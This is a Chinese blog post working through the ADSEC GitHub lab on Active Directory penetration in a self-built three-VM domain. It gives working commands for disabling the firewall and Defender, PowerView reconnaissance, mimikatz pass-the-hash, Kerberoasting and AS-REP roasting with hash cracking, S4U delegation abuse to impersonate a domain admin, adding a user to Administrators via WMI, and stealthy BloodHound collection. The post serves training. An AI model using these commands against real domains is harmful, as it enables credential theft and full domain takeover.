> 原文链接: https://www.anquanke.com//post/id/248030 


# 从Github一开源项目ADSEC学习域渗透攻防基础


                                阅读量   
                                **19342**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t0179d2505f273bcaa5.jpg)](https://p3.ssl.qhimg.com/t0179d2505f273bcaa5.jpg)



学习的开源项目是：

[https://github.com/cfalta/adsec](https://github.com/cfalta/adsec)

> 有些地方是直接Google 翻译过来的。
注意：本人域渗透新手，很多问题都不懂，有问题欢迎大哥后台留言啊！！！



## Lab Setup – 域环境搭建

> 学习的过程中，最难的就是环境搭建了。（因为有些坑，别人不一定遇到，么有地方可以问，然后有些问题就离谱。。）

物理机：MacBookPro 2020 Intel i5<br>
虚拟机：Vmware Fusion Windows Server 2019 * 3

域成员用户密码：P[@ssw0rd123](https://github.com/ssw0rd123)!（00和01）<br>
域机器本地管理员密码：P[@ssw0rd123](https://github.com/ssw0rd123)!@#（P[@ssw0rd123](https://github.com/ssw0rd123)!!!）<br>
域控机器管理员密码：P[@ssw0rd123](https://github.com/ssw0rd123)!!!<br>
密码随便自己设置符合要求就可以，这里列出来只是害怕忘记了。

搭建一个域控，两台域成员机器，然后能ping通就好了。<br>
Configure the following steps on every VM:
- Point the DNS server to the IP of ADSEC-DC
Disable Windows Firewall (run in Powershell with admin rights)
<li>Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False<br>
Disable Windows Defender</li>
- Uninstall-WindowsFeature -Name Windows-Defender
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d023dcdcfc8d60d0.jpg)

[![](https://p5.ssl.qhimg.com/t012b2ff67f71aace2f.jpg)](https://p5.ssl.qhimg.com/t012b2ff67f71aace2f.jpg)

在两台成员机器上用， john P[@ssw0rd](https://github.com/ssw0rd)/blee TekkenIsAwesome! 来认证加入域。

[![](https://p4.ssl.qhimg.com/t0159ee3351c6c3cb5f.jpg)](https://p4.ssl.qhimg.com/t0159ee3351c6c3cb5f.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0178c4a0fa3f17e764.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01da884e30799cab1e.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016bca9376407ce8b3.jpg)

[![](https://p1.ssl.qhimg.com/t0105685b33c99e7816.jpg)](https://p1.ssl.qhimg.com/t0105685b33c99e7816.jpg)



## 攻击机器环境搭建

该环境是假设john这台ADSEC-00 被攻破了，作为入口来进行AD域渗透。因为要通过powershell 脚本来安装攻击的工具，所以需要再分配一张网卡，让这台机器出网。

[![](https://p2.ssl.qhimg.com/t01d35cfa4233a3f049.jpg)](https://p2.ssl.qhimg.com/t01d35cfa4233a3f049.jpg)
- neo4j 图数据库安装
[https://neo4j.com/artifact.php?name=neo4j-desktop-1.4.7-setup.exe](https://neo4j.com/artifact.php?name=neo4j-desktop-1.4.7-setup.exe)

[https://www.oracle.com/java/technologies/javase-jdk11-downloads.html](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html)
- BloodHound


## Exercise 1 – Reconnaissance（域信息搜集）

这里主要是用的PowerView，<br>[https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)

首先是导入PowerView模块，

```
cat -raw ".\PowerView.ps1" | iex
```
- 域内基础信息和域控信息
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0134b0ecd87d07af9b.jpg)

比如域名、域控ip、域控的操作系统版本等
- 获取所有域计算机和用户
注意：通常情况下需要过滤，因为真实的域环境中会有大量结果。

```
Get-DomainComputer
```

过滤域管:

```
Get-DomainUser|?`{`$_.memberof -like "*Domain Admins*"`}`
```

[![](https://p4.ssl.qhimg.com/t01c16a146e64e23c60.jpg)](https://p4.ssl.qhimg.com/t01c16a146e64e23c60.jpg)

[![](https://p0.ssl.qhimg.com/t01f2897b4a41d57e20.jpg)](https://p0.ssl.qhimg.com/t01f2897b4a41d57e20.jpg)

```
Get-DomainUser|?`{`$_.memberof -like "*Domain Admins*"`}` | select samaccountname
```

只显示用户名：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011460fb06aba92a14.jpg)

获取所有域计算机，但仅显示名称、DNS 名称和创建日期，并以表格形式显示

```
Get-DomainComputer | select samaccountname,dnshostname,whencreated | Format-Table
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t012d8a11b183128176.jpg)

获取自定义用户组

```
Get-DomainGroup | ? `{` $_.distinguishedname -notlike "*CN=Users*" -and $_.distinguishedname -notlike "*CN=Builtin*"`}` | select samaccountname,description
```

[![](https://p4.ssl.qhimg.com/t01d7238f035a569718.jpg)](https://p4.ssl.qhimg.com/t01d7238f035a569718.jpg)



## 第一章问题

(主要就是熟悉PowerView的相关用法，Powershell查询语法)<br>[https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon)
- 域中有多少台计算机以及它们在什么操作系统上运行？
[![](https://p5.ssl.qhimg.com/t0190a6c3d900cd5d6b.jpg)](https://p5.ssl.qhimg.com/t0190a6c3d900cd5d6b.jpg)
- 域中有多少用户对象？编写一个 powershell 查询，以表格形式列出所有用户，仅显示属性 samaccountname、displayname、description 和最后一次密码更改
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0124a9cbe264870fe7.jpg)
- 您能识别任何自定义管理组吗？以通用方式更改上面的 powershell 查询，使其仅返回自定义管理组。
```
Get-DomainGroup | ? `{` $_.distinguishedname -like "*CN=Manage*" -or $_.distinguishedname -like "*CN=admin*"`}` | select samaccountname,description
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0112ac31175f8334e0.jpg)
- 谁是您找到的自定义管理员组的成员，他最后一次设置密码是什么时候？
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010e33b6b79ae94ec1.jpg)
<li>想出识别域中服务帐户的简单方法吗？编写一个 powershell 查询，根据您提出的模式列出所有服务帐户。
<pre><code class="hljs cs">Get-DomainUser -SPN |select serviceprincipalname,userprincipalname,pwdlastset,lastlogon
</code></pre>
</li>
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013911d774866a6446.jpg)



## Exercise 2 – NTLM (Pass-the-Hash)【哈希传递攻击】

工具：
- mimikatz
- psexec
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01df1e431289590ca7.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01576e3395efab1a05.jpg)

获取到管理员的hash，37bef461dec3d4cb748209d3c3185132

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01db14a870109d3e12.jpg)

然后pth，

```
sekurlsa::pth /user:Administrator /ntlm:37bef461dec3d4cb748209d3c3185132 /domain:redteamlab.com
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a8547d97030d265b.jpg)

问了下龙哥这种情况，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01a876cea9a10d6f56.jpg)

[https://support.accessdata.com/hc/en-us/articles/204150405-Disable-Remote-UAC](https://support.accessdata.com/hc/en-us/articles/204150405-Disable-Remote-UAC)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014bd0c0f474c0acb3.jpg)

然后需要重启。发现也不成功。。。 而且什么是remoteuac呢？

> 在windows Vista之后引入了一种默认开启的remote UAC，计算机的任何非SID 500本地管理员帐户， 用户在远程计算机上没有特权提升能力，并且用户无法执行管理任务。

kb2871997对于本地Administrator(rid为500，操作系统只认rid不认用户名，接下来我们统称RID 500帐户)和本地管理员组的域用户是没有影响的

我人傻bi了，我一直在非域控的机器上pth..



## 第二章问题
- mimikatz 命令“privilege::debug”和“token::elevate”的目的是什么？为什么需要执行它们？第一个是提权，第二个是假冒令牌。用于提升权限至 SYSTEM 权限（默认情况下）或者是发现计算机中的域管理员的令牌。
- 以 Bruce Lee 的身份登录 adsec-01。 使用您在上面学到的知识并帮助 john 从内存中远程提取 Bruce Lees NTLM 哈希。 注意：“lsadump::sam”只转储本地密码数据库。 您需要使用不同的命令从内存中提取数据。
[![](https://p2.ssl.qhimg.com/t019723964156d4f7d9.jpg)](https://p2.ssl.qhimg.com/t019723964156d4f7d9.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b113441581670b81.jpg)
<li>在互联网上研究如何最好地减轻传递哈希攻击。描述您认为最好的缓解技术，并解释您选择它们​​的原因。<br>
1.微软在2014年5月13日发布了针对Pass The Hash的更新补丁kb2871997，标题为”Update to fix the Pass-The-Hash Vulnerability”,而在一周后却把标题改成了”Update to improve credentials protection and management”。(事实上，这个补丁不仅能够缓解PTH,还能阻止mimikatz 抓取明文密码<br>
2.监控Windows事件日志，发现异常了马上应急处理<br>
3.禁用RID=500的管理员账户</li><li>是否有可能（并且可行）完全禁用 NTLM？解释你的理由。<br>
不可能，理由从正常使用来说，域认证和一些应用认证都需要NTLM Hash。从其他角度，还不知道。<br>
限制传入域的 NTLM 流量</li>


## Exercise 3 – Kerberos (Roasting)

使用Kerberoasting破解服务账号“taskservice”的密码。

加载使用的powershell 脚本：

```
cat -raw .\PowerView.ps1 | iex
cat -raw .\Invoke-Rubeus.ps1 | iex
```
- 获取具有服务主体名称 (SPN) 的所有域用户。
```
Get-DomainUser -SPN | select samaccountname, description, pwdlastset, serviceprincipalname
```

[![](https://p2.ssl.qhimg.com/t01f9a264d2e91e8551.jpg)](https://p2.ssl.qhimg.com/t01f9a264d2e91e8551.jpg)

使用Rebus来进行统计Kerberos

```
Invoke-Rubeus -Command "kerberoast /stats"
```

[![](https://p5.ssl.qhimg.com/t0100b120e2f10b0340.jpg)](https://p5.ssl.qhimg.com/t0100b120e2f10b0340.jpg)
- 运行 Rubeus 来获取目标用户的 TGS
```
Invoke-Rubeus -Command "kerberoast /user:taskservice /format:hashcat /outfile:krb5tgs.txt"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01454f96c4f7bdbb8e.jpg)

```
$krb5tgs$23$*taskservice$redteamlab.com$HTTP/task.contoso.com*$68EEDDB21370D83E51B255E76E092D96$236B6181FCE72FBDDD1593A6A0354248E2FFDCD8FF1C80FA1CD9CDCC5AF7B021D5650116FB85566BD51E646F6E7EDEC6A2CE72CBD4292919992A5809CE64EA5102D8F3698905D61864F5F3D248B80205EC82090F572F70CA6058FFA9B770EE2FDE5E6BDC17267C45D820DB32DE48BA75A4940948EBAD7F52F8E5E0CA0EFFAE5181692EC805BF9DD8B95F791064C039448DEA4E0D778209C18E9228FD8CACDBE1E38BE2B2510FF931D35B9C69FF459F223B0E97A55D1A9D8B6F33D563293DADAF5F11133CAFE6FEC13B2681148F88633C4E765CE7B37A23954ABC76F7D1203FD7E34C5F3B1F7BBE46C0D8A37BF96A73FFAD3DF7C2949A213FE1D26353FD8190893AE63F526C8E09AA2E7F1EB08CE0640D3420FD603AB14816F1D30100C758AC4028AA571F3F2423533FAAE2A8FA22CC7DC3322A160D0D5C667C6682B151A043615A4E8C008282EFDFE58E190686CF03DB92276968054BCDBBAA89456D3BBC98B8861D02C0FF8EBF211BF38D8632EEF913EC7C3981BDDAC048D1C7B8E77F86AA0AC455F393D4B21AC7F67B7DCEC79617995818955B0F9C19BCB409EFAF0B3644389607DF129199DE2A6D30E4A6B34781B2DE32D99AFEE1FF2935377EA45EE43DBEFCEB9C54C7315274E282F0B0329C0818D94953EDDA8F92E4BBF0A96777E10403F7D6A057E0E8FDFFF22ACE176D820DA6CD66E759D0CB21083F5CE466DEAC56B5A2FD2BF59C56BC0F5FEB8BCC81B4FA57FBB77EAB0A9E4C5EE663E35C6F0C1EEC3C9C87406EC699833C37C469682D9E54B3C76E6A041136D9962C239E2A9768C751456A3C830C5E004C31D93A17386EDF83F46CBA3CCE6C640EF128784044AF5F327D280E47007DA68CF3C10261F1E0B06DD674BA26EC518F1DF3136D5953F3265B964AC454A70BFDF18F89C3FA9EAF7A9C6AFC6C077B7B3282E1A49F7BE75316BE7497C0E387D36BDA129200A1C62F82333A38B2F6C4B0BF15A6EA38D9A8DCC8D0AED8520C864F84CE89253DB0F9BCB23A4C8C1A1880F512687982EB7DCA2CA4CCF38B2EDB9C53FE078AFDA87C2E8BA02D9930C4D7903E8EC97EB79CF8F796DDD4E056008E88B0A7A0A4B5EEC2E30A92E5CD2EF4E2D6F3955D3818D2311FBF31B32042159DF0592D03E478F50F9FE898DBF2C4865B6CE3511229B0F7F4C1ECFFA3B90E343401024FE5C999EB36337812F50C6ED95A69B2B3E951B3EC013D245BA48FB0347A33B930CA48A7516DCB198D7A3E03E9F97D89248ABC597D770EAF6100DEA9BD54CF63F4E87D784EC651403AF7ACEC1C8D1CD1645C526AEEBBE70F8A258DFF38C569462CC4E61E08EA2A26EC6007D0DC200181FBD32AADA9C5C6EF9168F3C85755773EE6C6878ED820722EB3CA57DE786005D5820FAFF8E0F6BA82436C91A2851C5132D6F973B12015A1211E7261A1C6FDAE79E62AB17C2B3110FD027731008D0EEBFB4CC4F9278518
```

使用john来破解TGS，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01d5bdcc848e655992.jpg)

```
.\john.exe ..\krb5tgs.txt  --wordlist=..\..\example.dict --rules=passphrase-rule2
```

[![](https://p1.ssl.qhimg.com/t01448f8e9a337351c7.jpg)](https://p1.ssl.qhimg.com/t01448f8e9a337351c7.jpg)



## 第三章问题
<li>在线研究如何最好地减轻 kerberoasting 攻击。描述您认为最好的缓解技术，并解释您选择它们​​的原因。增加密码长度，能够提高破解难度，并且定期修改关联的域用户口令。<br>
尽量将域内的服务器系统升级至少至 windows2008 系统，应用 AES256 高难度的加密算法<br>
禁止用户开启`do not require kerberos preauthentication`
</li><li>还有另一个用户帐户容易受到 `AS-REP roasting`的影响。使用上一个练习中类似的命令破解他的密码。 （提示：Get-DomainUser -NoPreauth）<br>[![](https://p4.ssl.qhimg.com/t01723df58f93a794a6.jpg)](https://p4.ssl.qhimg.com/t01723df58f93a794a6.jpg)
</li>
获取到hash

```
Invoke-Rubeus -Command "asreproast /user:svc.backup /format:hashcat /outfile:krb5tgs2.txt"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0135ad714c1e04ff7f.jpg)

使用john 破解密码

```
.\john.exe  C:\Users\john\krb5tgs2.txt  --wordlist=..\..\example.dict --rules=passphrase-rule2
  --wordlist=..\..\example.dict --rules=passphrase-rule2
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011aaa629ff08cd563.jpg)
<li>Explain the difference between the two attacks you just executed (TGS vs. ASREP roasting).[https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting](https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting)
</li>


## Exercise 4 – Kerberos (Delegation) 委派攻击

委派有：
- 约束委派
- 非约束委派
- 基于资源的约束委派
这里将滥用用户“taskservice”的约束委派权限来访问 adsec-01。
- 查找已启用约束委派的用户。
```
Get-DomainUser -TrustedToAuth
```

[![](https://p0.ssl.qhimg.com/t0130a85a917abe5e91.jpg)](https://p0.ssl.qhimg.com/t0130a85a917abe5e91.jpg)
- 查找允许的委派目标。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01580a46e9619d09e6.jpg)

```
Get-DomainUser -TrustedToAuth | select -ExpandProperty msds-allowedtodelegateto
```

因为之前通过 kerberoasting得到了 taskservice 的密码，我们可以生成hash，用

```
Invoke-Rubeus -Command "hash /password:Amsterdam2015 /domain:redteamlab.com /user:taskservice"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fffa929e8c696b25.jpg)

```
[*] Action: Calculate Password Hash(es)

[*] Input password             : Amsterdam2015
[*] Input username             : taskservice
[*] Input domain               : redteamlab.com
[*] Salt                       : REDTEAMLAB.COMtaskservice
[*]       rc4_hmac             : C010AED6AEE4804A3C49FDD0518FCA5D
[*]       aes128_cts_hmac_sha1 : D969340CE347859B0B8B44CA43D994EE
[*]       aes256_cts_hmac_sha1 : D5946D4144CE2AD1B450BAE60BC892F58326A9A29FC467F0E38D14A4F3AB00EA
[*]       des_cbc_md5          : 988F1CC4FB0DC873
```

Rubeus 允许我们在新的登录会话中启动 powershell。这意味着我们伪造的票据只存在于这次登录会话中，不会干扰用户 john 已经存在的 kerboers 票据。

```
Invoke-Rubeus -Command "createnetonly /program:C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe /show"
```

[![](https://p0.ssl.qhimg.com/t0128a79884924dc3b1.jpg)](https://p0.ssl.qhimg.com/t0128a79884924dc3b1.jpg)
- 使用 s4u 去向KDC 请求TGS 模拟域管理员 “Bruce Willis” (bwillis) 然后去攻击ADSEC-01，这里请求三种不同的服务票据，CIFS将用于SMB访问、HOST/RPCSS用于WMI
```
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:D5946D4144CE2AD1B450BAE60BC892F58326A9A29FC467F0E38D14A4F3AB00EA /impersonateuser:bwillis /msdsspn:cifs/adsec-01.redteamlab.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:D5946D4144CE2AD1B450BAE60BC892F58326A9A29FC467F0E38D14A4F3AB00EA /impersonateuser:bwillis /msdsspn:host/adsec-01.redteamlab.com /ptt"
Invoke-Rubeus -Command "s4u /user:taskservice /aes256:D5946D4144CE2AD1B450BAE60BC892F58326A9A29FC467F0E38D14A4F3AB00EA /impersonateuser:bwillis /msdsspn:rpcss/adsec-01.redteamlab.com /ptt"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0108ce6a35d0771657.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0197fc17dd3a5e4ba4.jpg)

s4u 是什么？这里复习一下 学习Kerberos 协议时的内容。<br>
S4U分两种，2SELF和2PROXY
- S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发 的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos 的方式对服务进行身份验证的情况下使用。这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的
- s4u2proxy 使得服务1可以使用来自用户的授权( 在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。
详细的过程可以去看daiker 师傅的文章。
- klist 查看生成的Kerberos 票据
[![](https://p1.ssl.qhimg.com/t01a0909977c761a4ac.jpg)](https://p1.ssl.qhimg.com/t01a0909977c761a4ac.jpg)
- 确定创建的票据是否成功
通过SMB：

```
ls \\adsec-01.redteamlab.com\C$
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016c372726d73183ac.jpg)

通过wmi：

```
Get-WmiObject -Class win32_process -ComputerName adsec-01.redteamlab.com
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0148d72a788691f91c.jpg)



## 第四章问题
<li>上面的练习中，您通过 SMB 和 WMI 获得了对服务器 adsec-01 的读取访问权限。 现在尝试通过这两个协议来获取代码执行全系。 目标是执行以下命令，该命令会将用户 john 添加到本地 admin 组：”net localgroup Administrators john /ADD”`wmic /node:adsec-01 process call create "cmd.exe /c net localgroup Administrators john /add"`
</li>
<li>实现一种使用 SMB 和 WMI 实现此同样目标的方法。提示：我们已经在 PTH 练习中使用了依赖于 SMB 的远程管理工具，并且 Powershell 包含用于调用 WMI 方法的本机命令。<br>
psexec</li>
<li>尝试模拟域管理员用户“Chuck Norris”而不是“Bruce Willis”。它有效吗？解释为什么。<br>
可以攻击ADSEC-DC（域控），而不是ADSEC-01.</li>


## Exercise 5 – ACL-based attacks

工具：
- PowerView
- BloodHoundAD
第一部分介绍使用 Bloodhound 从 Active Directory 收集和分析数据。第二部分演示了对组策略的基于 ACL 的攻击。

```
Invoke-Bloodhound -CollectionMethod DcOnly -Stealth -PrettyJson -NoSaveCache
```
- -CollectionMethod DcOnly 表示只从域控制器收集数据。 从 opsec 的角度来看，这是更可取的，因为从流量来看是正常的。
- -Stealth 意味着单线程运行。 速度较慢，但不容易被安全设备发现。
- -PrettyJson 格式化 .json 文件。
<li>-NoSaveCache 表示不保存缓存文件。 因此，每次运行 Sharphound 时，它都会从头开始。<br>[![](https://p2.ssl.qhimg.com/t01944e6c53299b6d9b.jpg)](https://p2.ssl.qhimg.com/t01944e6c53299b6d9b.jpg)
</li>
启动neo4j图数据库，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014f2a3f52457a35a8.jpg)

启动BloodHound，将之前跑出来的json 文件导入。

[![](https://p4.ssl.qhimg.com/t01766ecf66ff5ac946.jpg)](https://p4.ssl.qhimg.com/t01766ecf66ff5ac946.jpg)

在Queries中 选择寻找所有域管：

[![](https://p2.ssl.qhimg.com/t012aeb6481ccf20541.jpg)](https://p2.ssl.qhimg.com/t012aeb6481ccf20541.jpg)
- 将用户“taskservice”标记为已经拿下。找到允许我们使用用户 taskservice 控制域控制器的攻击路径。
